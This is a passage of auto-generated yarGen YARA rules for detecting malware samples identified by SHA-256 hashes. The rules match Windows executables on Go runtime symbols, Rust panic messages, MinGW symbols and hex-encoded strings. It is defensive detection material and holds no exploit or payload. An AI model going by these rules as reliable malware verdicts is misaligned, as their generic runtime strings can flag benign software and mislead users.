      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "44a6bfbe74ebb6955080974ce84771dfbb353989fcb4109f691c9b33fca95cb9"
      hash2 = "790154dd50acc1d6c631d9db53d857cb489403b05a741d3954b777d3fec2d9c6"
      hash3 = "eabb8e162f4c30c1157b0a4758ca5076f18cf4e31d7571020635dedd8d51c795"
   strings:
      $s1 = "runtime.memhash16" fullword ascii /* score: '13.00'*/
      $s2 = "runtime.memhash8" fullword ascii /* score: '13.00'*/
      $s3 = "internal/godebug.get" fullword ascii /* score: '12.00'*/
      $s4 = "internal/godebug.Get" fullword ascii /* score: '12.00'*/
      $s5 = "crypto.RegisterHash" fullword ascii /* score: '10.00'*/
      $s6 = "?pipeu*H" fullword ascii /* score: '10.00'*/
      $s7 = "encoding/json.(*UnsupportedValueError).Error" fullword ascii /* score: '10.00'*/
      $s8 = "*json.UnsupportedValueError" fullword ascii /* score: '10.00'*/
      $s9 = "math.Abs" fullword ascii /* score: '10.00'*/
      $s10 = "ReadFromInet4" fullword ascii /* score: '8.00'*/
      $s11 = "ReadMsgInet6" fullword ascii /* score: '8.00'*/
      $s12 = "ReadFromInet6" fullword ascii /* score: '8.00'*/
      $s13 = "ReadMsgInet4" fullword ascii /* score: '8.00'*/
      $s14 = "bytes.(*Buffer).Len" fullword ascii /* score: '7.00'*/
      $s15 = "*hash.Hash" fullword ascii /* score: '7.00'*/
      $s16 = "readVal" fullword ascii /* score: '7.00'*/
      $s17 = "fmt.Errorf" fullword ascii /* score: '7.00'*/
      $s18 = "vendor/golang.org/x/net/dns/dnsmessage.init" fullword ascii /* score: '7.00'*/
      $s19 = "crypto/sha1.New" fullword ascii /* score: '7.00'*/
      $s20 = "math/rand.New" fullword ascii /* score: '7.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 18000KB and ( 8 of them )
      ) or ( all of them )
}

rule _41182cb1d67e92bc21b515ded820077c8068531e57ccd44d27ff30f5c4b9ae5c_44a6bfbe74ebb6955080974ce84771dfbb353989fcb4109f691c9b33fc_12 {
   meta:
      description = "mw - from files 41182cb1d67e92bc21b515ded820077c8068531e57ccd44d27ff30f5c4b9ae5c, 44a6bfbe74ebb6955080974ce84771dfbb353989fcb4109f691c9b33fca95cb9"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "41182cb1d67e92bc21b515ded820077c8068531e57ccd44d27ff30f5c4b9ae5c"
      hash2 = "44a6bfbe74ebb6955080974ce84771dfbb353989fcb4109f691c9b33fca95cb9"
   strings:
      $s1 = "runtime/rwmutex.go" fullword ascii /* score: '18.00'*/
      $s2 = "sync/mutex.go" fullword ascii /* score: '15.00'*/
      $s3 = "runtime/fastlog2.go" fullword ascii /* score: '12.00'*/
      $s4 = "runtime/time_nofake.go" fullword ascii /* score: '12.00'*/
      $s5 = "runtime/mgcsweep.go" fullword ascii /* score: '12.00'*/
      $s6 = " is currently not supported for use in system callbackscasfrom_Gscanstatus:top gp->status is not in scan statecipher.NewCBCDecry" ascii /* score: '11.00'*/
      $s7 = "io/pipe.go" fullword ascii /* score: '10.00'*/
      $s8 = "runtime/hash64.go" fullword ascii /* score: '10.00'*/
      $s9 = "runtime/error.go" fullword ascii /* score: '10.00'*/
      $s10 = "runtime/internal/sys/intrinsics_common.go" fullword ascii /* score: '10.00'*/
      $s11 = "errors/errors.go" fullword ascii /* score: '7.00'*/
      $s12 = "runtime/netpoll_windows.go" fullword ascii /* score: '7.00'*/
      $s13 = "runtime/write_err.go" fullword ascii /* score: '7.00'*/
      $s14 = "runtime/mgcstack.go" fullword ascii /* score: '7.00'*/
      $s15 = "runtime/mcentral.go" fullword ascii /* score: '7.00'*/
      $s16 = "runtime/mspanset.go" fullword ascii /* score: '7.00'*/
      $s17 = "runtime/type.go" fullword ascii /* score: '7.00'*/
      $s18 = "runtime/time_windows_amd64.s" fullword ascii /* score: '7.00'*/
      $s19 = "runtime/stubs.go" fullword ascii /* score: '7.00'*/
      $s20 = "runtime/iface.go" fullword ascii /* score: '7.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 4000KB and ( 8 of them )
      ) or ( all of them )
}

rule _337ba1bd5050c38f5e07f494d4dc0125276b0e0dea09667d86e7d763249c8f30_3a9430e1b9d36d4a079b2197dd97d51e45adcaaf62bbcd4f06f73c6807_13 {
   meta:
      description = "mw - from files 337ba1bd5050c38f5e07f494d4dc0125276b0e0dea09667d86e7d763249c8f30, 3a9430e1b9d36d4a079b2197dd97d51e45adcaaf62bbcd4f06f73c680705a83c, 3bac3abbdcd2735ccff4692acd0ba8019e4a22426fcfeaa75c02419357d795a7, 6c164e7b8698fe634374181710aa0cfc9316ecb8102ad0ecf4e5e44d9ded50b5, 6e705467c0c083d343ad4f9e2833cd229605257b034bd3c4ac3342b156fb1594, 9b2b902f5fd53b72cabfcc0e0191c876c92c1c748bcdbb7c00f9d62d7ba76914, b225c6740e94211a16770e0fd1f0118b78a99f428bb7e7d4943b3e290c30b985, ec621d8d37fd8e0032228b3d756f2dc557f22b9b7e9fa02d3c53106d63644748, f9d6bf219602f987be31d47917824960cdf466d4be2df33768b9f939054d0928"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "337ba1bd5050c38f5e07f494d4dc0125276b0e0dea09667d86e7d763249c8f30"
      hash2 = "3a9430e1b9d36d4a079b2197dd97d51e45adcaaf62bbcd4f06f73c680705a83c"
      hash3 = "3bac3abbdcd2735ccff4692acd0ba8019e4a22426fcfeaa75c02419357d795a7"
      hash4 = "6c164e7b8698fe634374181710aa0cfc9316ecb8102ad0ecf4e5e44d9ded50b5"
      hash5 = "6e705467c0c083d343ad4f9e2833cd229605257b034bd3c4ac3342b156fb1594"
      hash6 = "9b2b902f5fd53b72cabfcc0e0191c876c92c1c748bcdbb7c00f9d62d7ba76914"
      hash7 = "b225c6740e94211a16770e0fd1f0118b78a99f428bb7e7d4943b3e290c30b985"
      hash8 = "ec621d8d37fd8e0032228b3d756f2dc557f22b9b7e9fa02d3c53106d63644748"
      hash9 = "f9d6bf219602f987be31d47917824960cdf466d4be2df33768b9f939054d0928"
   strings:
      $s1 = " Type Descriptor'" fullword ascii /* score: '10.00'*/
      $s2 = " Class Hierarchy Descriptor'" fullword ascii /* score: '6.00'*/
      $s3 = " Base Class Descriptor at (" fullword ascii /* score: '6.00'*/
      $s4 = " Complete Object Locator'" fullword ascii /* score: '5.00'*/
      $s5 = " delete[]" fullword ascii /* score: '4.00'*/
      $s6 = " delete" fullword ascii /* score: '3.00'*/
      $s7 = " new[]" fullword ascii /* score: '1.00'*/
      $s8 = " Base Class Array'" fullword ascii /* score: '0.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 18000KB and ( all of them )
      ) or ( all of them )
}

rule _41182cb1d67e92bc21b515ded820077c8068531e57ccd44d27ff30f5c4b9ae5c_44a6bfbe74ebb6955080974ce84771dfbb353989fcb4109f691c9b33fc_14 {
   meta:
      description = "mw - from files 41182cb1d67e92bc21b515ded820077c8068531e57ccd44d27ff30f5c4b9ae5c, 44a6bfbe74ebb6955080974ce84771dfbb353989fcb4109f691c9b33fca95cb9, 497f6f7e21dd3e9622c7cd9f96bb5359284cd21c24ea3faa99520397b911a08e, 790154dd50acc1d6c631d9db53d857cb489403b05a741d3954b777d3fec2d9c6, eabb8e162f4c30c1157b0a4758ca5076f18cf4e31d7571020635dedd8d51c795"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "41182cb1d67e92bc21b515ded820077c8068531e57ccd44d27ff30f5c4b9ae5c"
      hash2 = "44a6bfbe74ebb6955080974ce84771dfbb353989fcb4109f691c9b33fca95cb9"
      hash3 = "497f6f7e21dd3e9622c7cd9f96bb5359284cd21c24ea3faa99520397b911a08e"
      hash4 = "790154dd50acc1d6c631d9db53d857cb489403b05a741d3954b777d3fec2d9c6"
      hash5 = "eabb8e162f4c30c1157b0a4758ca5076f18cf4e31d7571020635dedd8d51c795"
   strings:
      $s1 = "encoding/base64.(*Encoding).DecodedLen" fullword ascii /* score: '11.00'*/
      $s2 = "DecodedLen" fullword ascii /* score: '11.00'*/
      $s3 = "reflect.name.data" fullword ascii /* score: '11.00'*/
      $s4 = "reflect.name.readVarint" fullword ascii /* score: '10.00'*/
      $s5 = "reflect.add" fullword ascii /* score: '10.00'*/
      $s6 = "reflect.(*uncommonType).exportedMethods" fullword ascii /* score: '10.00'*/
      $s7 = "*[]*unicode.RangeTable" fullword ascii /* score: '9.00'*/
      $s8 = "&*map.bucket[string]*unicode.RangeTable" fullword ascii /* score: '9.00'*/
      $s9 = "EncodedLen" fullword ascii /* score: '9.00'*/
      $s10 = "*unicode.RangeTable" fullword ascii /* score: '9.00'*/
      $s11 = "*[8]*unicode.RangeTable" fullword ascii /* score: '9.00'*/
      $s12 = "SetComplex" fullword ascii /* score: '7.00'*/
      $s13 = "encoding/binary.bigEndian.PutUint64" fullword ascii /* score: '7.00'*/
      $s14 = "*reflect.ValueError" fullword ascii /* score: '7.00'*/
      $s15 = "setRunes" fullword ascii /* score: '7.00'*/
      $s16 = "mustBeExportedSlow" fullword ascii /* score: '7.00'*/
      $s17 = "encoding/binary.bigEndian.Uint32" fullword ascii /* score: '7.00'*/
      $s18 = "IsExported" fullword ascii /* score: '7.00'*/
      $s19 = "*reflect.uncommonType" fullword ascii /* score: '7.00'*/
      $s20 = "reflect.toType" fullword ascii /* score: '7.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 18000KB and ( 8 of them )
      ) or ( all of them )
}

rule _b225c6740e94211a16770e0fd1f0118b78a99f428bb7e7d4943b3e290c30b985_c0b4b7b1183401644c556b5cc8e92c0f13970a370fca43635785f65f81_15 {
   meta:
      description = "mw - from files b225c6740e94211a16770e0fd1f0118b78a99f428bb7e7d4943b3e290c30b985, c0b4b7b1183401644c556b5cc8e92c0f13970a370fca43635785f65f81e9a1d5"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "b225c6740e94211a16770e0fd1f0118b78a99f428bb7e7d4943b3e290c30b985"
      hash2 = "c0b4b7b1183401644c556b5cc8e92c0f13970a370fca43635785f65f81e9a1d5"
   strings:
      $s1 = "7469616c697a" ascii /* score: '17.00'*/ /* hex encoded string 'tializ' */
      $s2 = "717273747576" ascii /* score: '17.00'*/ /* hex encoded string 'qrstuv' */
      $s3 = "436f6e74656e" ascii /* score: '17.00'*/ /* hex encoded string 'Conten' */
      $s4 = "626364656667" ascii /* score: '17.00'*/ /* hex encoded string 'bcdefg' */
      $s5 = "414243444546" ascii /* score: '17.00'*/ /* hex encoded string 'ABCDEF' */
      $s6 = "57696e646f77" ascii /* score: '17.00'*/ /* hex encoded string 'Window' */
      $s7 = "6a6b6c6d6e6f" ascii /* score: '17.00'*/ /* hex encoded string 'jklmno' */
      $s8 = "616263646566" ascii /* score: '17.00'*/ /* hex encoded string 'abcdef' */
      $s9 = "515253545556" ascii /* score: '17.00'*/ /* hex encoded string 'QRSTUV' */
      $s10 = "6164706f6f6c" ascii /* score: '17.00'*/ /* hex encoded string 'adpool' */
      $s11 = "2a2b2c2d2e2f" ascii /* score: '17.00'*/ /* hex encoded string '*+,-./' */
      $s12 = "010101010101" ascii /* reversed goodware string '101010101010' */ /* score: '11.00'*/
      $s13 = "020202020202" ascii /* reversed goodware string '202020202020' */ /* score: '11.00'*/
      $s14 = "23222120-2524-2726-2829-2a2b2c2d2e2f" fullword ascii /* score: '9.00'*/ /* hex encoded string '#"! %$'&()*+,-./' */
      $s15 = "4a494847-4c4b-4e4d-4f50-515253545556" fullword ascii /* score: '9.00'*/ /* hex encoded string 'JIHGLKNMOPQRSTUV' */
      $s16 = "20202020-2020-2020-2020-202020202020" fullword ascii /* score: '9.00'*/ /* hex encoded string '                ' */
      $s17 = "6a696867-6c6b-6e6d-6f70-717273747576" fullword ascii /* score: '9.00'*/ /* hex encoded string 'jihglknmopqrstuv' */
      $s18 = "5a595857-0000-0000-0000-000000000000" fullword ascii /* score: '9.00'*/ /* hex encoded string 'ZYXW' */
      $s19 = "7a797877-0000-0000-0000-414243444546" fullword ascii /* score: '9.00'*/ /* hex encoded string 'zyxwABCDEF' */
      $s20 = "00000000-0000-0000-0000-616263646566" fullword ascii /* score: '9.00'*/ /* hex encoded string 'abcdef' */
   condition:
      ( uint16(0) == 0x5a4d and filesize < 5000KB and ( 8 of them )
      ) or ( all of them )
}

rule _0d214808a672a6096734ee1bf66596f7a025e2dd7b9b51dba084d15782de8b4b_44a6bfbe74ebb6955080974ce84771dfbb353989fcb4109f691c9b33fc_16 {
   meta:
      description = "mw - from files 0d214808a672a6096734ee1bf66596f7a025e2dd7b9b51dba084d15782de8b4b, 44a6bfbe74ebb6955080974ce84771dfbb353989fcb4109f691c9b33fca95cb9"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "0d214808a672a6096734ee1bf66596f7a025e2dd7b9b51dba084d15782de8b4b"
      hash2 = "44a6bfbe74ebb6955080974ce84771dfbb353989fcb4109f691c9b33fca95cb9"
   strings:
      $s1 = "runtime: bad pointer in frame runtime: found in object at *(runtime: impossible type kind socket operation on non-socketsync: in" ascii /* score: '18.00'*/
      $s2 = "runtime.sysAllocOS" fullword ascii /* score: '14.00'*/
      $s3 = "runtime/internal/atomic.(*Int64).CompareAndSwap" fullword ascii /* score: '14.00'*/
      $s4 = "runtime/internal/atomic.(*Uint64).CompareAndSwap" fullword ascii /* score: '14.00'*/
      $s5 = "runtime.(*goroutineProfileStateHolder).CompareAndSwap" fullword ascii /* score: '14.00'*/
      $s6 = "targetCPUFraction" fullword ascii /* score: '14.00'*/
      $s7 = "runtime.limiterEventStamp.typ" fullword ascii /* score: '13.00'*/
      $s8 = "runtime/internal/atomic.(*Uint8).And" fullword ascii /* score: '10.00'*/
      $s9 = "consistent mutex statesync: unlock of unlocked mutexunsafe.Slice: len out of range) not in usable address space: ...additional f" ascii /* score: '10.00'*/
      $s10 = "runtime.makeLimiterEventStamp" fullword ascii /* score: '10.00'*/
      $s11 = "runtime.limiterEventStamp.duration" fullword ascii /* score: '10.00'*/
      $s12 = "runtime.name.isEmbedded" fullword ascii /* score: '10.00'*/
      $s13 = "runtime.traceReaderAvailable" fullword ascii /* score: '10.00'*/
      $s14 = "internal/cpu.getGOAMD64level" fullword ascii /* score: '9.00'*/
      $s15 = "scannedStacks" fullword ascii /* score: '9.00'*/
      $s16 = "scannedStackSize" fullword ascii /* score: '9.00'*/
      $s17 = "goal  KiB total,  MB stacks,  [recovered] allocCount  found at *( gcscandone  m->gsignal= maxTrigger= nDataRoots= nSpanRoots= pa" ascii /* score: '8.00'*/
      $s18 = "goal  KiB total,  MB stacks,  [recovered] allocCount  found at *( gcscandone  m->gsignal= maxTrigger= nDataRoots= nSpanRoots= pa" ascii /* score: '8.00'*/
      $s19 = "gomaxprocs" fullword ascii /* score: '8.00'*/
      $s20 = "runtime.(*atomicOffAddr).StoreMarked" fullword ascii /* score: '7.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 4000KB and ( 8 of them )
      ) or ( all of them )
}

rule _33c8ee21fb63ede72a217351f7faf1fa81f731dbe8fe46f3e9c9a6dbb6d7a365_6b3be5de40b3f2d063389b53e5fc63950ee2b9aad46d5ecc1e23c54674_17 {
   meta:
      description = "mw - from files 33c8ee21fb63ede72a217351f7faf1fa81f731dbe8fe46f3e9c9a6dbb6d7a365, 6b3be5de40b3f2d063389b53e5fc63950ee2b9aad46d5ecc1e23c546746952b3, c879b4f8bd38ddc5797d625effb573e7478dbc57efb3c99593c2a5a98d12b641"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "33c8ee21fb63ede72a217351f7faf1fa81f731dbe8fe46f3e9c9a6dbb6d7a365"
      hash2 = "6b3be5de40b3f2d063389b53e5fc63950ee2b9aad46d5ecc1e23c546746952b3"
      hash3 = "c879b4f8bd38ddc5797d625effb573e7478dbc57efb3c99593c2a5a98d12b641"
   strings:
      $s1 = "Unable to create keyed event handle: error " fullword ascii /* score: '15.00'*/
      $s2 = "lock count overflow in reentrant mutexlibrary\\std\\src\\sync\\remutex.rs" fullword ascii /* score: '15.00'*/
      $s3 = "thread panicked while processing panic. aborting." fullword ascii /* score: '15.00'*/
      $s4 = "keyed events not available" fullword ascii /* score: '14.00'*/
      $s5 = "attempted to index str up to maximum usize" fullword ascii /* score: '13.00'*/
      $s6 = "SetThreadDescription" fullword ascii /* score: '10.00'*/
      $s7 = "failed to generate unique thread ID: bitspace exhausted" fullword ascii /* score: '10.00'*/
      $s8 = "formatter error" fullword ascii /* score: '9.00'*/
      $s9 = "failed to reserve stack space for exception handling" fullword ascii /* score: '9.00'*/
      $s10 = "failed to write whole buffer" fullword ascii /* score: '9.00'*/
      $s11 = "failed to install exception handler" fullword ascii /* score: '9.00'*/
      $s12 = "thread '' panicked at '', " fullword ascii /* score: '7.00'*/
      $s13 = "library\\std\\src\\sys_common\\wtf8.rs" fullword ascii /* score: '7.00'*/
      $s14 = "note: Some details are omitted, run with `RUST_BACKTRACE=full` for a verbose backtrace." fullword ascii /* score: '7.00'*/
      $s15 = "Windows stdio in console mode does not support writing non-UTF-8 byte sequences" fullword ascii /* score: '7.00'*/
      $s16 = "`fmt::Error`s should be impossible without a `fmt::Formatter`" fullword ascii /* score: '7.00'*/
      $s17 = "BorrowMutError" fullword ascii /* score: '7.00'*/
      $s18 = "already borrowedlibrary\\std\\src\\io\\stdio.rs" fullword ascii /* score: '7.00'*/
      $s19 = "note: run with `RUST_BACKTRACE=1` environment variable to display a backtrace" fullword ascii /* score: '7.00'*/
      $s20 = "library\\std\\src\\sys\\windows\\thread_parking.rs" fullword ascii /* score: '7.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 11000KB and ( 8 of them )
      ) or ( all of them )
}

rule _0d214808a672a6096734ee1bf66596f7a025e2dd7b9b51dba084d15782de8b4b_41182cb1d67e92bc21b515ded820077c8068531e57ccd44d27ff30f5c4_18 {
   meta:
      description = "mw - from files 0d214808a672a6096734ee1bf66596f7a025e2dd7b9b51dba084d15782de8b4b, 41182cb1d67e92bc21b515ded820077c8068531e57ccd44d27ff30f5c4b9ae5c, 44a6bfbe74ebb6955080974ce84771dfbb353989fcb4109f691c9b33fca95cb9, 790154dd50acc1d6c631d9db53d857cb489403b05a741d3954b777d3fec2d9c6, eabb8e162f4c30c1157b0a4758ca5076f18cf4e31d7571020635dedd8d51c795"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "0d214808a672a6096734ee1bf66596f7a025e2dd7b9b51dba084d15782de8b4b"
      hash2 = "41182cb1d67e92bc21b515ded820077c8068531e57ccd44d27ff30f5c4b9ae5c"
      hash3 = "44a6bfbe74ebb6955080974ce84771dfbb353989fcb4109f691c9b33fca95cb9"
      hash4 = "790154dd50acc1d6c631d9db53d857cb489403b05a741d3954b777d3fec2d9c6"
      hash5 = "eabb8e162f4c30c1157b0a4758ca5076f18cf4e31d7571020635dedd8d51c795"
   strings:
      $s1 = "runtime/internal/atomic.(*Uintptr).CompareAndSwap" fullword ascii /* score: '14.00'*/
      $s2 = "runtime/internal/atomic.(*Uint32).CompareAndSwap" fullword ascii /* score: '14.00'*/
      $s3 = "runtime.(*activeSweep).markDrained" fullword ascii /* score: '12.00'*/
      $s4 = "runtime.(*activeSweep).sweepers" fullword ascii /* score: '12.00'*/
      $s5 = "runtime.(*activeSweep).begin" fullword ascii /* score: '12.00'*/
      $s6 = "runtime.(*activeSweep).isDone" fullword ascii /* score: '12.00'*/
      $s7 = "runtime.(*activeSweep).reset" fullword ascii /* score: '12.00'*/
      $s8 = "runtime.isNaN" fullword ascii /* score: '10.00'*/
      $s9 = "runtime.isFinite" fullword ascii /* score: '10.00'*/
      $s10 = "runtime/internal/atomic.(*Uint64).Add" fullword ascii /* score: '10.00'*/
      $s11 = "runtime.block" fullword ascii /* score: '10.00'*/
      $s12 = "runtime.allGsSnapshot" fullword ascii /* score: '10.00'*/
      $s13 = "runtime.isInf" fullword ascii /* score: '10.00'*/
      $s14 = "runtime/internal/atomic.(*Uintptr).Add" fullword ascii /* score: '10.00'*/
      $s15 = "runtime/internal/atomic.(*Int64).Add" fullword ascii /* score: '10.00'*/
      $s16 = "runtime.printArgs.func3" fullword ascii /* score: '10.00'*/
      $s17 = "runtime.(*gcControllerState).addScannableStack" fullword ascii /* score: '8.00'*/
      $s18 = "entryoff" fullword ascii /* score: '8.00'*/
      $s19 = "runtime.(*gcControllerState).addGlobals" fullword ascii /* score: '7.00'*/
      $s20 = "runtime/internal/atomic.(*Uintptr).Store" fullword ascii /* score: '7.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 18000KB and ( 8 of them )
      ) or ( all of them )
}

rule _33c8ee21fb63ede72a217351f7faf1fa81f731dbe8fe46f3e9c9a6dbb6d7a365_497f6f7e21dd3e9622c7cd9f96bb5359284cd21c24ea3faa99520397b9_19 {
   meta:
      description = "mw - from files 33c8ee21fb63ede72a217351f7faf1fa81f731dbe8fe46f3e9c9a6dbb6d7a365, 497f6f7e21dd3e9622c7cd9f96bb5359284cd21c24ea3faa99520397b911a08e"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "33c8ee21fb63ede72a217351f7faf1fa81f731dbe8fe46f3e9c9a6dbb6d7a365"
      hash2 = "497f6f7e21dd3e9622c7cd9f96bb5359284cd21c24ea3faa99520397b911a08e"
   strings:
      $s1 = "__mingw_winmain_lpCmdLine" fullword ascii /* score: '12.00'*/
      $s2 = "mingw_get_invalid_parameter_handler" fullword ascii /* score: '9.00'*/
      $s3 = "__imp__get_invalid_parameter_handler" fullword ascii /* score: '9.00'*/
      $s4 = "startinfo" fullword ascii /* score: '8.00'*/
      $s5 = "managedapp" fullword ascii /* score: '8.00'*/
      $s6 = "mainret" fullword ascii /* score: '8.00'*/
      $s7 = ".refptr.__imp__acmdln" fullword ascii /* score: '7.00'*/
      $s8 = ".rdata$.refptr.__imp__acmdln" fullword ascii /* score: '7.00'*/
      $s9 = "__mingw_winmain_nShowCmd" fullword ascii /* score: '7.00'*/
      $s10 = "mingw_set_invalid_parameter_handler" fullword ascii /* score: '4.00'*/
      $s11 = ".refptr.mingw_initltsdrot_force" fullword ascii /* score: '4.00'*/
      $s12 = "mingw_initcharmax" fullword ascii /* score: '4.00'*/
      $s13 = "mingw_pcppinit" fullword ascii /* score: '4.00'*/
      $s14 = "__mingw_pinit" fullword ascii /* score: '4.00'*/
      $s15 = ".rdata$.refptr.mingw_initltsdrot_force" fullword ascii /* score: '4.00'*/
      $s16 = ".refptr._fmode" fullword ascii /* score: '4.00'*/
      $s17 = "__imp__set_invalid_parameter_handler" fullword ascii /* score: '4.00'*/
      $s18 = ".refptr._MINGW_INSTALL_DEBUG_MATHERR" fullword ascii /* score: '4.00'*/
      $s19 = ".refptr.__imp__fmode" fullword ascii /* score: '4.00'*/
      $s20 = "__tmainCRTStartup" fullword ascii /* score: '4.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 15000KB and ( 8 of them )
      ) or ( all of them )
}

rule _6c164e7b8698fe634374181710aa0cfc9316ecb8102ad0ecf4e5e44d9ded50b5_790154dd50acc1d6c631d9db53d857cb489403b05a741d3954b777d3fe_20 {
   meta:
      description = "mw - from files 6c164e7b8698fe634374181710aa0cfc9316ecb8102ad0ecf4e5e44d9ded50b5, 790154dd50acc1d6c631d9db53d857cb489403b05a741d3954b777d3fec2d9c6"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "6c164e7b8698fe634374181710aa0cfc9316ecb8102ad0ecf4e5e44d9ded50b5"
      hash2 = "790154dd50acc1d6c631d9db53d857cb489403b05a741d3954b777d3fec2d9c6"
   strings:
      $s1 = "wOUigi<" fullword ascii /* score: '4.00'*/
      $s2 = "YedcCH}" fullword ascii /* score: '4.00'*/
      $s3 = "J#}QU^u" fullword ascii /* score: '1.00'*/
      $s4 = "aS&v&*" fullword ascii /* score: '1.00'*/
      $s5 = "s=%(nh0" fullword ascii /* score: '1.00'*/
      $s6 = "Nz3I#B" fullword ascii /* score: '1.00'*/
      $s7 = "}BzJ88" fullword ascii /* score: '1.00'*/
      $s8 = "z1_|'B" fullword ascii /* score: '1.00'*/
      $s9 = "so=H*m" fullword ascii /* score: '1.00'*/
      $s10 = "Dd g4X3" fullword ascii /* score: '1.00'*/
      $s11 = "3Ej%Tb" fullword ascii /* score: '1.00'*/
      $s12 = "J_R=I)" fullword ascii /* score: '1.00'*/
      $s13 = "SQ8_d`\\" fullword ascii /* score: '1.00'*/
      $s14 = "$>Mm/JhA" fullword ascii /* score: '1.00'*/
      $s15 = "k/.fG\"" fullword ascii /* score: '1.00'*/
      $s16 = "&q6}A," fullword ascii /* score: '1.00'*/
      $s17 = "K5!n^n" fullword ascii /* score: '1.00'*/
      $s18 = "V<\"+u~" fullword ascii /* score: '1.00'*/
      $s19 = "<3AC|[sqb" fullword ascii /* score: '1.00'*/
      $s20 = "-,O'-U" fullword ascii /* score: '1.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 18000KB and ( 8 of them )
      ) or ( all of them )
}

rule _0d214808a672a6096734ee1bf66596f7a025e2dd7b9b51dba084d15782de8b4b_44a6bfbe74ebb6955080974ce84771dfbb353989fcb4109f691c9b33fc_21 {
   meta:
      description = "mw - from files 0d214808a672a6096734ee1bf66596f7a025e2dd7b9b51dba084d15782de8b4b, 44a6bfbe74ebb6955080974ce84771dfbb353989fcb4109f691c9b33fca95cb9, 90ef0ec74f1a5d49a9e605387dc8807bc8c6967ccfb5cc94678df73c340385ad"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "0d214808a672a6096734ee1bf66596f7a025e2dd7b9b51dba084d15782de8b4b"
      hash2 = "44a6bfbe74ebb6955080974ce84771dfbb353989fcb4109f691c9b33fca95cb9"
      hash3 = "90ef0ec74f1a5d49a9e605387dc8807bc8c6967ccfb5cc94678df73c340385ad"
   strings:
      $s1 = "runtime.gfget.func2" fullword ascii /* score: '15.00'*/
      $s2 = "runtime.sysUnusedOS" fullword ascii /* score: '14.00'*/
      $s3 = "runtime.sysFreeOS" fullword ascii /* score: '14.00'*/
      $s4 = "runtime.sysReserveOS" fullword ascii /* score: '14.00'*/
      $s5 = "runtime.sysUsedOS" fullword ascii /* score: '14.00'*/
      $s6 = "runtime.sysFaultOS" fullword ascii /* score: '14.00'*/
      $s7 = "runtime.gcControllerCommit" fullword ascii /* score: '13.00'*/
      $s8 = "runtime.gcComputeStartingStackSize" fullword ascii /* score: '13.00'*/
      $s9 = "runtime.atoi64" fullword ascii /* score: '10.00'*/
      $s10 = "runtime.parseByteCount" fullword ascii /* score: '10.00'*/
      $s11 = "runtime.findRunnable" fullword ascii /* score: '10.00'*/
      $s12 = "runtime.fatal.func1" fullword ascii /* score: '10.00'*/
      $s13 = "runtime.tryRecordGoroutineProfile" fullword ascii /* score: '10.00'*/
      $s14 = "runtime.saveg" fullword ascii /* score: '10.00'*/
      $s15 = "runtime.doRecordGoroutineProfile.func1" fullword ascii /* score: '10.00'*/
      $s16 = "runtime.readGOMEMLIMIT" fullword ascii /* score: '10.00'*/
      $s17 = "runtime.doRecordGoroutineProfile" fullword ascii /* score: '10.00'*/
      $s18 = "runtime.fatal" fullword ascii /* score: '10.00'*/
      $s19 = "runtime.tryRecordGoroutineProfileWB" fullword ascii /* score: '10.00'*/
      $s20 = "runtime.(*mheap).allocSpan.func1" fullword ascii /* score: '7.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 5000KB and ( 8 of them )
      ) or ( all of them )
}

rule _337ba1bd5050c38f5e07f494d4dc0125276b0e0dea09667d86e7d763249c8f30_3a9430e1b9d36d4a079b2197dd97d51e45adcaaf62bbcd4f06f73c6807_22 {
   meta:
      description = "mw - from files 337ba1bd5050c38f5e07f494d4dc0125276b0e0dea09667d86e7d763249c8f30, 3a9430e1b9d36d4a079b2197dd97d51e45adcaaf62bbcd4f06f73c680705a83c, 6c164e7b8698fe634374181710aa0cfc9316ecb8102ad0ecf4e5e44d9ded50b5, 6e705467c0c083d343ad4f9e2833cd229605257b034bd3c4ac3342b156fb1594, 9b2b902f5fd53b72cabfcc0e0191c876c92c1c748bcdbb7c00f9d62d7ba76914, b225c6740e94211a16770e0fd1f0118b78a99f428bb7e7d4943b3e290c30b985"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "337ba1bd5050c38f5e07f494d4dc0125276b0e0dea09667d86e7d763249c8f30"
      hash2 = "3a9430e1b9d36d4a079b2197dd97d51e45adcaaf62bbcd4f06f73c680705a83c"
      hash3 = "6c164e7b8698fe634374181710aa0cfc9316ecb8102ad0ecf4e5e44d9ded50b5"
      hash4 = "6e705467c0c083d343ad4f9e2833cd229605257b034bd3c4ac3342b156fb1594"
      hash5 = "9b2b902f5fd53b72cabfcc0e0191c876c92c1c748bcdbb7c00f9d62d7ba76914"
      hash6 = "b225c6740e94211a16770e0fd1f0118b78a99f428bb7e7d4943b3e290c30b985"
   strings:
